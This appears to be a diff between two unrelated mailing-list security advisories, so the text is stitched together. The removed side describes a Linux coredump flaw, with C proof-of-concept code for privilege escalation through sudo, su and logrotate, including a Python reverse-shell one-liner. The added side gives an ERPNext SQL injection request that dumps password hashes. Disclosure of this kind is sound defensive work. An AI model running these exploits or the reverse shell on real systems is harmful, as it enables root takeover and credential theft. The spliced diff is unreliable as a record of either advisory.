@@ -1,292 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/20/2
-Message-ID: <CAExjoYv2aT+DjmBvT55OuSBqKpEeZwBkiCf_yA1kMNR=-ALpew@mail.gmail.com>
-Date: Wed, 20 Oct 2021 15:45:49 +0300
-From: Itai Greenhut <itai.greenhut@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Core-dump handing issues with suid binaries
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/11/7
+Message-ID: <IV6PM0BF5xvdzKqp9Gl1kRbVbEwYHfBEis05qRSkaueB_f4cQIXWBj1jnUqgcX6lQ3ezklmmLiAv-y93PQVQwzIGIcu46GPqBbu57QP8nkI=@trovent.io>
+Date: Tue, 11 May 2021 11:45:56 +0000
+From: Stefan Pietsch <s.pietsch@...vent.io>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
+Subject: Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+# Trovent Security Advisory 2103-01 #
+#####################################
 
-As the maximum allowed 14 days of embargo has passed, this is a public
-announcement of a vulnerability in the linux kernel that can lead to
-exploitation of suid binaries.
 
+Authenticated SQL injection in ERPNext 13.0.0/12.18.0
+#####################################################
 
-Vulnerabilities in coredump handling can lead to LPE
 
-================================================
+Overview
+########
 
-SUMMARY
---------------------------------------------------------------
+Advisory ID: TRSA-2103-01
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2103-01
+Affected product: ERPNext
+Tested versions: 12.18.0 and 13.0.0 beta
+Vendor: Frappé Technologies https://frappe.io
+Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
 
-We found a technique that can be used to write coredump files into
-arbitrary directories (even those requiring root permissions). These files
-can be leveraged to execute arbitrary code via logrotate.
 
-The issue can be exploited with sudo (tested on Ubuntu 21.04 + debian 11)
-on a machine that is configured to allow a user to run a command as root.
+Detailed description
+####################
 
+Trovent Security GmbH discovered an SQL Injection vulnerability
+in the "frappe.model.db_query.get_list" API endpoint.
+On version 13.0.0 valid credentials without any privileges are sufficient
+but on version 12.18.0 at least "system_user" privileges are required.
+The vulnerable parameter "filters" allows injection of SQL statements.
+An attacker is able to query all available database tables to retrieve
+usernames, password hashes or password reset tokens which can then be used
+to reset administrator passwords.
 
-Issue:
---------------------------------------------------------------
 
-Every process has a “dumpable” integer attribute. The value of this
-attribute determines what to do when a process receives signals that
-usually result in a coredump.
+Severity: High
+CVSS Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+CWE ID: 89
+CVE ID: TBD
 
-We will focus on the behavior of suid binaries.
 
-There are three possible values:
-0 - Coredump won't be produced for a suid program
-1 - Coredump will be produced when possible
-2 - Coredump will be produced for suid programs, only if core_pattern is an
-absulote path or a pipe to a usermode program.
+Proof of concept
+################
 
+Sample request made with a non system account to retrieve password hashes:
 
-When executing a suid binary on a default configuration (core_pattern is
-relative and suid_dumpable is 0 or 2) the process won't create a coredump
-for the suid processes.
+REQUEST:
 
-We noticed that if we have a suid binary that uses execve, the new dumpable
-value is determined in the "begin_new_exec" function, from fs/exec.c (code
-taken from kernel 5.13.12):
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-"""
 
-if (bprm->interp_flags & BINPRM_FLAGS_ENFORCE_NONDUMP ||
-    !(uid_eq(current_euid(), current_uid()) &&
-      gid_eq(current_egid(), current_gid())))
-    set_dumpable(current->mm, suid_dumpable);
-else
-    set_dumpable(current->mm, SUID_DUMP_USER);
+GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20'%3b%20do%20sleep(10)&order_by=name&_=1615372773071 HTTP/1.1
+Host: erpnext.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bcf3
+X-Frappe-CMD:
+X-Frappe-Doctype: Dashboard%20Settings
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://erpnext.local/app/website
+Cookie: io=NVosyhHCvV3KdkxNAAi7; sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; system_user=no; full_name=auth%20test%27; user_id=auth%40trovent.io; user_image=
 
-"""
 
-We can see in this code that if a suid binary changes its privileges to
-have the real uid equal effective uid, and real gid equal effective gid,
-then the process after execve will have a dumpable value of SUID_DUMP_USER
-(1). If that process were to crash, a coredump file would be generated with
-uid:gid permissions.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-Exploitation:
----------------------------------------------------------
 
-We tested the exploit on Ubuntu 21.04 and Debian 11 (with slight
-modifications to the code).
+RESPONSE:
 
-To exploit this behavior, we first had to find a suid binary that meets the
-following requirements:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-1. A root suid binary.
-2. Sets uid and gid to 0 (setuid(0) and setgid(0) are called).
-3. Uses execve.
 
+HTTP/1.1 200 OK
+Server: nginx/1.19.7
+Date: Wed, 10 Mar 2021 16:04:40 GMT
+Content-Type: application/json
+Connection: close
+Vary: Accept-Encoding
+Set-Cookie: sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; Expires=Sat, 13-Mar-2021 16:04:40 GMT; HttpOnly; Path=/; SameSite=Lax
+Set-Cookie: system_user=no; Path=/; SameSite=Lax
+Set-Cookie: full_name=auth%20test%27; Path=/; SameSite=Lax
+Set-Cookie: user_id=auth%40trovent.io; Path=/; SameSite=Lax
+Set-Cookie: user_image=; Path=/; SameSite=Lax
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Content-Length: 719
 
-After investigating a few binaries, we found that sudo is suitable for our
-purpose.
-With sudo, the issue only affects machines configured via /etc/sudoers to
-let a low-privileges user to run a command as root (the exact command
-doesn't matter, as we will show later).
+{"message":[{"name":"$pbkdf2-sha256$29000$0fofo/SeE0IoRQgh5HyvVQ$IuyDVu5v4Hc4Z7Pe/3Tvpim7AdhbYrI9b9XXL39/tVU"},{"name":"$pbkdf2-sha256$29000$1vqfk3KO0ZqT8n7vvff.nw$A9a6k9wbegrw5QUiJ/jj1.kXCr.lwRSJtv5S7QTCQgU"},{"name":"$pbkdf2-sha256$29000$aA2B8P7/X.vd./.fM6aUkg$JluCIXXrUgKxTUwvRyveCRIDjJ0mhhoG9Cs6onAO2Do"},{"name":"$pbkdf2-sha256$29000$CSFEKCVEqPVe611rrdVayw$pFf/iBuprNIdZ4DoJadro0UUNaffy.2v5EbAe4Nbxco"},{"name":"$pbkdf2-sha256$29000$L2WMkdLaG2NM6V3rnXMOAQ$snURvXF1kNTGA7Zux.HLoQ5JISRajyOBiAZ1VDjEJnc"},{"name":"$pbkdf2-sha256$29000$r/UeQ.id0/rfm9M6Z4yR8g$1w/oAvTRNJ7wKuSHgZ.4jkDHQAvLLYxerzYeHpd1IV8"},{"name":"gAAAAABgP1dTiYpJ67JyyUjytcay4XmKoOuyf_jAke7slDwL4gIM5lCWCbu6SjYOPOX6WigAm0fZzGgTEIiXNCA_yPZI64ijmA=="}]}
 
-We have successfully exploited the following configuration on the latest
-Ubuntu release ('user' is a low privileged user).
 
-"""
-user ALL= /usr/bin/true
-"""
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-The above configuration means that 'user' can only run the /usr/bin/true
-binary as root, which does almost nothing.
 
-When running /usr/bin/true with sudo, sudo will call setuid(0) and
-setgid(0), then fork and execve the /usr/bin/true binary. After the execve,
-the dumpable value of the new process will be set to 1.
+Solution / Workaround
+#####################
 
-Now we only need to make sure that we can crash *any* child process of
-sudo, and a core file will be generated for that process.
+To mitigate this vulnerability, we recommend to limit access to the affected API endpoint.
+As a permanent solution it is recommended not to insert user input directly into SQL queries.
 
-We have two options on how to crash the child process.
 
-1. we can set RLIMIT_CPU to 0 in the parent that calls sudo. Child
-processes inherit the rlimit values from their parents, and those values
-are also preserved across execve.
-Therefore, the /usr/bin/true binary will crash almost immediately after
-beginning execution, and create a coredump file in the current directory of
-the process.
+History
+#######
 
-Providing 0 to RLIMIT_CPU is available from commit
-(2bbdbdae05167c688b6d3499a7dab74208b80a22)
+2021-03-10: Vulnerability found
+2021-03-11: Advisory created and vendor contacted
+2021-03-22: Vendor replied that they request CVE IDs after a fix is released
+2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
+2021-05-03: Vendor contacted, asking for status
+2021-05-07: No reply from vendor, vendor contacted again
+2021-05-11: Advisory published
 
-2. We can fork a new process and execute the suid binary, meanwhile at the
-parent process we will “insert” CTRL+\ (SIGQUIT) character to the terminal
-(with \x1C character on ioctl TIOCSTI).
 
-The SIGQUIT character in the tty driver will send SIGQUIT signal to the
-process group of the parent results in a coredump of the child of suid
-process (That way we bypass the fact that we cannot send signals to the
-child of suid).
-
-Now, to get the privilege escalation, all we have to do is to set the
-current working directory to /etc/logrotate.d/, and include a valid
-logrotate configuration in the memory of the crashed process.
-
-To include the logrotate configuration in the coredump file, we transfer
-the configuration through specific environment variables, that the children
-of sudo binary inherit (sudo filters most of them but we were able to use
-XAUTHORITY).
-
-The PoC must run multiple times because sometimes the sudo program times
-out before the child is executed.
-
-
-Sudo PoC (tested on Ubuntu 21.04):
-
----------------------------------------------------------
-
-1. Start with a low-privileged user
-2. Add configuration so the user will be able to execute 'true' as root.
-3. Touch /var/crash/test.log
-4. Change the directory to /etc/logrotate.d/
-5. Run the PoC code multiple times until a coredump file is created in
-/etc/logrotate.d/
-
-"""
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/time.h>
-#include <sys/resource.h>
-
-
-int main(int argc, char **argv, char **envp)
-{
-char *nargv[] = {"sudo", "true", NULL};
-struct rlimit lim;
-
-char *xauth_env = "\n/var/crash/test.log{\n su root root\n daily\n size=0\n
-firstaction\n /usr/bin/python3 -c \"import sys,socket,os,pty;
-s=socket.socket();s.connect(('127.0.0.1', 1234));[os.dup2(s.fileno(), fd)
-for fd in (0,1,2)]; pty.spawn('/bin/sh')\";\n endscript\n}\n\nA\"";
-
-setenv("XAUTHORITY", xauth_env, 1);
-chdir("/etc/logrotate.d");
-
-lim.rlim_cur = 0;
-lim.rlim_max = RLIM_INFINITY;
-setrlimit(RLIMIT_CPU, &lim);
-lim.rlim_cur = RLIM_INFINITY;
-lim.rlim_max = RLIM_INFINITY;
-setrlimit(RLIMIT_CORE, &lim);
-
-execve("/usr/bin/sudo", nargv, envp);
-return 0;
-}
-"""
-
-6. A coredump file should now be present in /etc/logrotate.d/core. When
-logrotate runs, it will read the configuration files from
-/etc/logrotate.d/. logrotate's configuration format is not strict, and it
-will read the coredump until reaching a valid configuration (present in the
-dump as part of the XAUTHORITY environment variable value), which will
-connect to our listening server as root.
-
-
-Another example:
----------------------------------------------------------
-
-While investigating other binaries trying to find a binary that satisfies
-our requirements, we found that there are several default binaries that
-authenticate through pam.
-
-This was tested on Centos 7 which still receive security update until 2024
-(centos 8 will not work because their coredumps are on absolute paths)
-
-One of the binaries is /usr/bin/su which eventually calls pam_unix.so.
-CentOS 7 ships with an outdated version of pam which will call a helper
-(/usr/sbin/unix_chkpwd) when selinux is enabled (which is in centos 7).
-
-Before executing /usr/sbin/unix_chkpwd pam_unix will call setuid(0) which
-will satisfy our requirements from before. Because CentOS 7 comes with an
-old kernel which we can’t use RLIMIT_CPU to generate dump with (The process
-dies too fast) we will use our second method.
-
-
-We are able to generate coredump in specified directory. Before executing
-the child pam_unix wipes all the previous environment. As for now we
-haven’t found a way yet to include a logrotate configuration in the memory
-of the child’s coredump.
-
-
-Su PoC (tested on CentOS 7):
----------------------------------------------------------
-
-1. Start with a low-privileged user
-2. Run the PoC code multiple times (with incremental sleep time) until a
-coredump file is created in /etc/logrotate.d/
-
-"""
-#include <sys/ioctl.h>
-#include <termios.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <stdio.h>
-#include <sys/time.h>
-#include <sys/resource.h>
-
-
-int main(int argc, char **argv, char **envp)
-{
-    struct rlimit lim;
-    lim.rlim_cur = RLIM_INFINITY;
-    lim.rlim_max = RLIM_INFINITY;
-    setrlimit(RLIMIT_CORE, &lim);
-
-    chdir("/etc/logrotate.d/");
-    pid_t pid = fork();
-    if (0 == pid)
-    {
-        char *nargv[] = {"su", "-m", "root", NULL};
-        execve("/usr/bin/su", nargv, envp);
-        exit(1);
-    }
-    else
-    {
-        usleep(atoi(argv[1]));
-        char code = '\x1C';
-        ioctl(STDIN_FILENO, TIOCSTI, &code);
-    }
-    return 0;
-}
-
-"""
-
-Workarounds:
----------------------------------------------------------
-This exploit can be mitigated using a few workarounds.
-
-1. Change /proc/sys/kernel/core_pattern to an absolute, safe directory
-(this way, logrotate cannot be triggered).
-2. Apparently, at some point in time, pam_limits.so was removed from the
-PAM configuration of sudo (in Debian and Ubuntu). Adding this module to the
-sudo's PAM configuration and setting RLIMIT_CORE to 0 makes sudo immune to
-this vulnerability.
-
-
-As discussed with security@...nel.org and linux-distros@...openwall.org a
-permanent fix to this vulnerability will probably need to be inside the
-linux kernel, one of the suggestions that came up was to reset RLIMIT_CORE
-of a suid process to 0 by default. Any fix to this issue would probably
-break user expectations from the linux kernel because suddenly their
-coredump won't be created.
-
-
-
-Best Regards,
-Itai Greenhut
-Aleph Research by HCL AppScan
-
+Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
